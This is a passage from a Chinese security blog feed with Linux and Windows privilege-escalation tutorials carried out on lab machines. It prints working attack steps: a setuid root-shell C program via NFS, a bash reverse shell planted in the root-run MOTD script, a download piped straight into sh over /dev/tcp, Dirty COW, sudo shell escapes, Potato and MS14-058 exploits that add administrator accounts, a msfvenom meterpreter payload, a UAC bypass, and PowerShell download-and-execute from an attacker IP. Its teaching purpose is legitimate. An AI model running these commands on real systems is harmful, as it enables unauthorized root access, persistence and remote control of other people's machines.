会使得 root 在 NFS 客户端上拥有和服务器上相同的权限</p>\n<p>利用：</p>\n<p>创建一个目录进行挂载</p>\n<p><code>mkdir /home/kali/hc/nfs-shell</code></p>\n<p><code>mount -o rw,vers=3 192.168.1.144:/tmp /home/kali/hc/nfs-shell</code></p>\n<p>rw 读写权限，vers3 版本</p>\n<p>成功挂载</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226142439658.png\" alt=\"image-20240226142439658\"></p>\n<p>接下来写一个提权程序</p>\n<p><code>vim shell.c</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash -p\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编译然后给 shell 执行权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226145826134.png\" alt=\"image-20240226145826134\"></p>\n<p>回到受害机执行提权到 root</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226170226574.png\" alt=\"image-20240226170226574\"></p>\n<h3 id=\"内核提权\"><a class=\"markdownIt-Anchor\" href=\"#内核提权\">#</a> 内核提权</h3>\n<p>查看内核版本 <code>uname -a</code></p>\n<p><code>curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code></p>\n<p>下载 linpeas 脚本收集信息</p>\n<p>如果没有 curl 可以用 kali 下载 nc 传过来</p>\n<p><code>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code></p>\n<p>kali： <code>nc -lvnp 80 &lt; linpeas.sh</code></p>\n<p>受害： <code>cat &lt; /dev/tcp/192.168.1.145/80 | sh</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226191302928.png\" alt=\"image-20240226191302928\"></p>\n<h4 id=\"脏牛提权cve-2016-5195\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权cve-2016-5195\">#</a> 脏牛提权 (CVE-2016-5195)</h4>\n<p><code>searchsploit</code>  搜索脏牛</p>\n<p>​\t<img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226192506760.png\" alt=\"image-20240226192506760\"></p>\n<p>有这些漏洞利用脚本下一个</p>\n<p><code>searchsploit -m 40839.c</code></p>\n<p>传到受害查看说明</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226192639018.png\" alt=\"image-20240226192639018\"></p>\n<p>要用 - pthread 和 - lcrypt 编译编译好后执行然后输入新的密码就可以了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226193427616.png\" alt=\"image-20240226193427616\"></p>\n<h3 id=\"motd机制提权\"><a class=\"markdownIt-Anchor\" href=\"#motd机制提权\">#</a> MOTD 机制提权</h3>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226195723017.png\" alt=\"image-20240226195723017\"></p>\n<p><code>update-motd.d</code>  目录下的脚本在用户通过 SSH 登录时会被执行，用于生成登录后的欢迎信息这些脚本通常以 root 权限运行</p>\n<p><code>00-header</code>  是  <code>update-motd.d</code>  目录下的一个脚本如果一个用户对  <code>00-header</code>  文件有写权限，那么他们就可以修改这个文件，插入一些恶意代码例如，他们可以添加一个修改 root 用户密码的命令或者反弹 shell 当其他用户通过 SSH 登录时， <code>00-header</code>  脚本会以 root 权限运行，执行其中的命令</p>\n<p><code>vim </code> 输入 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.145/4444 0&gt;&amp;1&quot;</code></p>\n<p>kali 监听 <code>nc -lvnp 4444</code></p>\n<p>再重新 ssh 登陆让他执行这个脚本，成功拿到 root</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240226200442064.png\" alt=\"image-20240226200442064\"></p>\n<h3 id=\"sudo提权\"><a class=\"markdownIt-Anchor\" href=\"#sudo提权\">#</a> sudo 提权</h3>\n<h4 id=\"sudofind-提权\"><a class=\"markdownIt-Anchor\" href=\"#sudofind-提权\">#</a> sudofind 提权</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-exec</span> /bin/sh <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">;</span> <span class=\"token parameter variable\">-quit</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301183010100.png\" alt=\"image-20240301183010100\"></p>\n<h4 id=\"sudoapt提权\"><a class=\"markdownIt-Anchor\" href=\"#sudoapt提权\">#</a> sudoapt 提权</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update <span class=\"token parameter variable\">-o</span> APT::Update::Pre-Invoke::<span class=\"token operator\">=</span>/bin/sh</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301183347295.png\" alt=\"image-20240301183347295\"></p>\n<h4 id=\"sudovim提权\"><a class=\"markdownIt-Anchor\" href=\"#sudovim提权\">#</a> sudovim 提权</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> <span class=\"token parameter variable\">-c</span> <span class=\"token string\">':!/bin/sh'</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301193448209.png\" alt=\"image-20240301193448209\"></p>\n<h3 id=\"gtfobins\"><a class=\"markdownIt-Anchor\" href=\"#gtfobins\">#</a> GTFOBins</h3>\n<p>这个网站可以搜索更多 sudo suid 提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301201128501.png\" alt=\"image-20240301201128501\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240301201241369.png\" alt=\"image-20240301201241369\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "url": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "title": "Windows提权",
            "date_published": "2023-11-09T12:28:50.000Z",
            "content_html": "<h3 id=\"提权基础\"><a class=\"markdownIt-Anchor\" href=\"#提权基础\">#</a> <span class=\"label\">提权基础</span></h3>\n<p>获取 webshell 后一般都是 www-data 权限权限很低所以要进行提权把权限提高为了后续渗透顺利</p>\n<p>windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权 ftp 提权 令牌窃取提权等姿势。</p>\n<p>使用 Windows 命令提示符执行的，它将系统信息输出到名为 &quot;a.txt&quot; 的文件中，然后检查特定的 Windows 更新是否已安装。如果某些指定的更新未安装，它会输出一条消息表示这些更新未安装。最后，它会删除临时文件 &quot;a.txt</p>\n<p>systeminfo&gt;a.txt&amp;(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110225111274.png\" alt=\"image-20231110225111274\"></p>\n<p>提权辅助:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4v\">https://i.hacking8.com/tiquan/</span></p>\n<p>windows 漏洞集合<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=\"> https://github.com/SecWiki/windows-kernel-exploits</span></p>\n<h3 id=\"收集信息常用命令\"><a class=\"markdownIt-Anchor\" href=\"#收集信息常用命令\">#</a> <span class=\"label\">收集信息常用命令</span></h3>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ipconfig /all                                            --网卡配置</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>systeminfo                                               --系统补丁信息等</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo %PROCESSOR_ARCHITECTURE%                            --系统体系结构</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>wmic product get name,version                            --安装软件、版本、路径</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>wmic service list brief                                  --查询本机服务信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>tasklist -svc                                            --进程查看</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>schtasks /query /fo list /v                              --任务计划查询</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>net statistics workstation                               --开机时间</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>net user                                                 --查看用户</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>whoami /all                                              --SID等用户信息</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>net localgroup administrators                            --查看管理员组中的用户</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>net session                                              --会话查看</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>netstat -ano                                             --网络连接以及通过端口判断服务</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>net share                                                --共享</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>route print                                              --路由信息</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>arp -a                                                   --arp信息</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>cmdkey /l                                                --登录历史</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hosts文件  Linux：/etc/hosts  Windows：c:\\Windows\\system32\\drivers\\etc\\hosts</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ipconfig  /displaydns                                    --dns缓存</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>net view                                                 --查看共享</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>dir /s /b \"pass\" \"user\" \"config\" \"username.\" \"password.\" --命令行查找敏感文件</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>findstr  /s /m \"password\" *.*                            --寻找包含密码字段的文件，如数据库密码文件</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>net user /domain                                         --查看域用户</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>net time /domain                                         --查看时间服务器（可能为DC）</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>net group \"domain admins\" /domain                        --查看域管理员</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>net group \"domaincontrollers\" /domain                    --查看域控制器</pre></td></tr></table></figure><p>net user 显示当前系统中的所有用户信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110133913521.png\" alt=\"image-20231110133913521\"></p>\n<p>net user 31166 查看用户详细信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134358877.png\" alt=\"image-20231110134358877\"></p>\n<h4 id=\"whoami-all\"><a class=\"markdownIt-Anchor\" href=\"#whoami-all\">#</a> <span class=\"label\">whoami /all</span></h4>\n<p>获取当前用户详细信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134649977.png\" alt=\"image-20231110134649977\"></p>\n<h4 id=\"hostname\"><a class=\"markdownIt-Anchor\" href=\"#hostname\">#</a> <span class=\"label\">hostname</span></h4>\n<p>获取主机名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134745836.png\" alt=\"image-20231110134745836\"></p>\n<h4 id=\"whoami-priv\"><a class=\"markdownIt-Anchor\" href=\"#whoami-priv\">#</a> <span class=\"label\">whoami /priv</span></h4>\n<p>获取当前用户的安全特权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134929728.png\" alt=\"image-20231110134929728\"></p>\n<h4 id=\"net-start\"><a class=\"markdownIt-Anchor\" href=\"#net-start\">#</a> <span class=\"label\">net start</span></h4>\n<p>获取已经启动的 Windows 服务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110135119067.png\" alt=\"image-20231110135119067\"></p>\n<h4 id=\"systeminfo\"><a class=\"markdownIt-Anchor\" href=\"#systeminfo\">#</a> <span class=\"label\">systeminfo</span></h4>\n<p>获取电脑打了那些补丁为之后提权打下基础</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151656666.png\" alt=\"image-20231110151656666\"></p>\n<h4 id=\"扫描可写可读目录\"><a class=\"markdownIt-Anchor\" href=\"#扫描可写可读目录\">#</a> <span class=\"label\">扫描可写可读目录</span></h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151233596.png\" alt=\"image-20231110151233596\"></p>\n<h3 id=\"windows常用提权\"><a class=\"markdownIt-Anchor\" href=\"#windows常用提权\">#</a> <span class=\"label\">windows 常用提权</span></h3>\n<h4 id=\"ms16-075烂土豆提权\"><a class=\"markdownIt-Anchor\" href=\"#ms16-075烂土豆提权\">#</a> <span class=\"label\">MS16-075 烂土豆提权</span></h4>\n<p>影响版本：Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2012 等</p>\n<p>下载网址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1N3ZWV0UG90YXRv\">https://github.com/uknowsec/SweetPotato</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0p1aWN5UG90YXRvL2Jsb2IvbWFpbi9KdWljeVBvdGF0by1zaGVsbGNvZGUvQmluL0p1aWN5UG90YXRvLmV4ZQ==\">https://github.com/uknowsec/JuicyPotato/blob/main/JuicyPotato-shellcode/Bin/JuicyPotato.exe</span></p>\n<p>找到了可读写目录上传 exe</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110153059031.png\" alt=\"image-20231110153059031\"></p>\n<p>执行命令</p>\n<p>C:\\inetpub\\wwwroot\\dedecms\\JuicyPotato_x64.exe net user yunyi2 1234567890 /add &amp;&amp; net localgroup administrators yunyi/add</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110160256590.png\" alt=\"image-20231110160256590\"></p>\n<h4 id=\"ms14-058提权\"><a class=\"markdownIt-Anchor\" href=\"#ms14-058提权\">#</a> <span class=\"label\">MS14-058 提权</span></h4>\n<p>具体而言，win32k.sys 是 Windows 子系统的一部分，负责窗口管理和屏幕输出。如果内核模块未正确处理内存中的对象，攻击者可能会通过利用这一漏洞来在内核模式中执行任意代码。成功利用此漏洞的攻击者可以在系统中运行具有更高权限的代码，进而执行一系列危险操作，如安装程序、查看、更改或删除数据，或者创建具有完全管理权限的新账户。</p>\n<p>影响版本<br>\n Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下</p>\n<p>上传 exe 到可执行目录</p>\n<p>whoami 看到已经是 nt authority\\system</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182725492.png\" alt=\"image-20231110182725492\"></p>\n<p>64.exe “net user yunyi 123456 /add” 添加用户</p>\n<p>64.exe &quot;net localgroup administrators yunyi /add&quot; 添加到管理员组</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182123803.png\" alt=\"image-20231110182123803\"></p>\n<p>远程端口连接成功</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182617605.png\" alt=\"image-20231110182617605\"></p>\n<h4 id=\"cve-2020-0787\"><a class=\"markdownIt-Anchor\" href=\"#cve-2020-0787\">#</a> <span class=\"label\">CVE-2020-0787</span></h4>\n<p>影响版本</p>\n<p>Windows 10 Version 1809 for ARM64-based Systems<br>\nWindows Server 2008 for 32-bit Systems Service Pack 2<br>\nWindows RT 8.1<br>\nWindows 8.1 for x64-based systems<br>\nWindows 8.1 for 32-bit systems<br>\nWindows 7 for x64-based Systems Service Pack 1<br>\nWindows 7 for 32-bit Systems Service Pack 1<br>\nWindows Server 2016 (Server Core installation)<br>\nWindows Server 2016<br>\nWindows 10 Version 1607 for x64-based Systems<br>\nWindows 10 Version 1607 for 32-bit Systems<br>\nWindows 10 for x64-based Systems<br>\nWindows 10 for 32-bit Systems<br>\nWindows Server, version 1903 (Server Core installation)<br>\nWindows 10 Version 1903 for ARM64-based Systems<br>\nWindows 10 Version 1903 for x64-based Systems<br>\nWindows 10 Version 1903 for 32-bit Systems<br>\nWindows 10 Version 1709 for ARM64-based Systems<br>\nWindows 10 Version 1709 for x64-based Systems<br>\nWindows 10 Version 1709 for 32-bit Systems<br>\nWindows Server, version 1909 (Server Core installation)<br>\nWindows 10 Version 1909 for ARM64-based Systems<br>\nWindows 10 Version 1909 for x64-based Systems<br>\nWindows 10 Version 1909 for 32-bit Systems<br>\nWindows Server 2019 (Server Core installation)<br>\nWindows Server 2019<br>\nWindows Server 2012 R2 (Server Core installation)<br>\nWindows Server 2012 R2<br>\nWindows Server 2012 (Server Core installation)<br>\nWindows Server 2012<br>\nWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>\nWindows Server 2008 R2 for x64-based Systems Service Pack 1<br>\nWindows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>\nWindows Server 2008 for x64-based Systems Service Pack 2<br>\nWindows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>\nWindows 10 Version 1809 for x64-based Systems<br>\nWindows 10 Version 1809 for 32-bit Systems<br>\nWindows 10 Version 1803 for ARM64-based Systems<br>\nWindows Server, version 1803 (Server Core Installation)<br>\nWindows 10 Version 1803 for x64-based Systems<br>\nWindows 10 Version 1803 for 32-bit Systems</p>\n<p>脚本地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nid2FuZzUwNS9DVkUtMjAyMC0wNzg3LUVYUC1BTEwtV0lORE9XUy1WRVJTSU9OL3JlbGVhc2VzL3RhZy8x\">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1</span></p>\n<p>要求上桌面执行，会弹出系统权限的 cmd</p>\n<p>把 exe 上传后切换上面创建的用户登陆桌面</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185051791.png\" alt=\"image-20231110185051791\"></p>\n<p>执行后弹出 cmd</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185214126.png\" alt=\"image-20231110185214126\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185227277.png\" alt=\"image-20231110185227277\"></p>\n<h3 id=\"msf利用\"><a class=\"markdownIt-Anchor\" href=\"#msf利用\">#</a> <span class=\"label\">msf 利用</span></h3>\n<p>先生成一个木马文件</p>\n<p>msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=8989-f exe &gt;/vs.exe</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110211226995.png\" alt=\"image-20231110211226995\"></p>\n<p>msf 打开监听</p>\n<p>use exploit/multi/handler</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n<p>set lhost 192.168.27.11</p>\n<p>set lport 8989</p>\n<p>exploit</p>\n<p>用 webshell 上传到受害机执行木马文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213027928.png\" alt=\"image-20231110213027928\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213439218.png\" alt=\"image-20231110213439218\"></p>\n<p>跟之前一样查看打了那些补丁</p>\n<p>输入 shell 获取 cmd 使用 systeminfo 获取到信息后跟之前一样去找可以用的提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214317729.png\" alt=\"image-20231110214317729\"></p>\n<p>用 background 命令把会话放在后台，可以用 session 查看已建立的会话信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214725591.png\" alt=\"image-20231110214725591\"></p>\n<p>search ms14_058 查找漏洞信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214943295.png\" alt=\"image-20231110214943295\"></p>\n<p>use exploit/windows/local/ms14_058_track_popup_menu</p>\n<p>show options 查看利用要求</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110215511454.png\" alt=\"image-20231110215511454\"></p>\n<p>设置会话 id 刚才看的是 session 2 所以设置为 2</p>\n<p>set session 2</p>\n<p>然后 exploit 执行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110220237813.png\" alt=\"image-20231110220237813\"></p>\n<p>use exploit/windows/local/ms16_075_reflection_juicy</p>\n<p>ms14_058 没有成功所以换了 ms16 _075 成功获取 system 权限</p>\n<p>切换 shell 添加用户并加入管理员</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221425934.png\" alt=\"image-20231110221425934\"></p>\n<p>维权</p>\n<p>ps 列出进程</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221951490.png\" alt=\"image-20231110221951490\"></p>\n<p>migrate 1184</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110222507771.png\" alt=\"image-20231110222507771\"></p>\n<h3 id=\"uac提权\"><a class=\"markdownIt-Anchor\" href=\"#uac提权\">#</a> <span class=\"label\">UAC 提权</span></h3>\n<p>用户账户控制（UAC）是 Windows 操作系统中的一项安全特性。它旨在帮助防止未经授权的对计算机的更改。当一个程序尝试执行需要管理员权限的更改时，UAC 会通知用户并在允许更改之前征得用户的确认。</p>\n<p>UAC 通过确保只有在用户明确同意的情况下才执行管理操作，有助于降低未经授权的更改和恶意软件安装的风险。这样，即使用户以管理员身份登录，他们仍然需要确认他们意图执行可能对系统造成影响的某些操作。</p>\n<p>前提：已获取目标本地用户权限</p>\n<p>上传 msf 木马执行</p>\n<p>现在为普通用户权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102136583.png\" alt=\"image-20231111102136583\"></p>\n<p>search 搜索一下 UAC 利用模块</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111100615934.png\" alt=\"image-20231111100615934\"></p>\n<p>使用 exploit/windows/local/bypassuac 模块</p>\n<p>set session 5</p>\n<p>run</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102853388.png\" alt=\"image-20231111102853388\"></p>\n<p>执行成功过后再使用 getsystem</p>\n<p>getuid 查看已经是 system 权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102946311.png\" alt=\"image-20231111102946311\"></p>\n<h3 id=\"windows系统配置错误提权\"><a class=\"markdownIt-Anchor\" href=\"#windows系统配置错误提权\">#</a> <span class=\"label\">windows 系统配置错误提权</span></h3>\n<h4 id=\"系统服务权限配置错误\"><a class=\"markdownIt-Anchor\" href=\"#系统服务权限配置错误\">#</a> <span class=\"label\">系统服务权限配置错误</span></h4>\n<p>Windows 在系统启动时，会伴随着一些高权服务启动 (windows 服务是以 system 权限运行的) 如果某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如 DLL 劫持</p>\n<p>如果一个低权限用户对系统服务调用的可执行文件有写权限，他们可以替换该文件，并在系统启动时获取控制权限。尽管 Windows 服务以 system 权限运行，其文件夹、文件和注册表项受到强制访问控制的保护，但在某些情况下，仍可能存在一些缺乏有效保护的服务。</p>\n<p><span class=\"label\">Metasploit</span></p>\n<p>上线木马当前是 iis 权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112119228.png\" alt=\"image-20231111112119228\"></p>\n<p>background 把会话放在后台</p>\n<p>切换到 use exploit/windows/local/service_permissions 攻击模块</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112359457.png\" alt=\"image-20231111112359457\"></p>\n<p>set session 4</p>\n<p>设置为 session 4</p>\n<p>exploit 执行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112807154.png\" alt=\"image-20231111112807154\"></p>\n<p><span class=\"label\">PrivescCheck</span></p>\n<p>脚本地址<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2l0bTRuL1ByaXZlc2NDaGVjaw==\"> https://github.com/itm4n/PrivescCheck</span></p>\n<p>列举共同 Windows 配置问题  ，可以利用当地的权限升级</p>\n<p>使用 1:   基本的使用情况</p>\n<pre><code>powershell -ep bypass -c &quot;. .\\PrivescCheck.ps1; Invoke-PrivescCheck&quot;\n</code></pre>\n<p>远程使用</p>\n<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object \nNet.WebClient).DownloadString('http://192.168.27.11/PrivescCheck.ps1'); Invoke-PrivescCheck&quot;\n</code></pre>\n<p><span class=\"label\">PowerUp</span></p>\n<p>导入并执行脚本 powershell.exe -exec bypass -command “&amp;{Import-Module .\\PowerUp.ps1;Invoke-AllChecks}”</p>\n<p><img 